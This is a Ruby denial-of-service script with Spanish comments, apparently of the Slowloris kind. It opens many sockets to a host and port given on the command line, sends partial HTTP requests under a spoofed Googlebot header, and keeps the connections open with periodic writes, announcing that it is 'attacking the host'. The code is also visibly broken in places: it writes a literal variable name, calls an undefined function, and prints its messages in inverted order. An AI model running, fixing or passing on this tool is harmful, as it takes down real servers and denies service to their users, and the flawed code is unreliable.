require "socket"

def iniciar_socket(url, puerto, recurso)
  #crea un nuevo socket
  socket = Socket.new(:INET, :STREAM)
  #Establece los datos del socket
  socket_address = Socket.pack_sockaddr_in(puerto, url)
  #Establece la conexión del socket
  socket.connect(socket_address)

  #Realiza le petición HTTP
  socket.write((recurso))
  
  # headers
  $regular_headers.each { |h|
    socket.write("#{h}\r\n".encode("utf-8"))
  }  
  return socket
end

def main
  url = ARGV[0]
  puerto = ARGV[1]
  numPeticiones = ARGV[2].to_i
  recurso = ""
  if ARGV[3].size < 3
    recurso = ARGV[3].to_s
  end
  
  puts ">>>>> Atacando al host " + url

  #Crea los sockets
  for i in (1..numPeticiones.to_i)
    begin
      if recurso.empty?
        puts(">> GET /" + recurso.to_s + " HTTP/1.1 ::: numero: " + i.to_s)
      else
        puts(">> GET / HTTP/1.1 ::: numero: " + i.to_s)
      end
      s = iniciar_socket(url, puerto, recurso)
    rescue
      break;
    end
    $sockets << s
  end
  
  while true
    # Envía encabezados Keep-alive 
    puts "#{$sockets.size} "
    $sockets.each { |s|
      begin
        s.write("recurso")
        puts "Encabezado enviado"
      rescue 
        $sockets.delete(s)
      end            
    }
    
    # Si un socket muere, lo reinicia
    for i in (1..(numPeticiones - $sockets.size))
      puts("Reiniciando socket...")
      begin
        s = init_socket(url)
        $sockets << s if s
      rescue
        break
      end      
    end
    
    # sleeps for a while
    sleep(15)
  end
end

#Estas variables son globales para mejorar la creación y manejo de los sockets
#Para envíar el Keep-alive
$prng = Random.new(1234)
$sockets = [] #arreglo de sockets
$regular_headers = [
  #Me parece más fiable un googlebot
  #"User-agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:36.0) Gecko/20100101 Firefox/36.0.4 Waterfox/36.0.4",
  "Googlebot/2.1 (http://www.googlebot.com/bot.html)",
  "Accept-language: en-US,en,q=0.5"
]

main()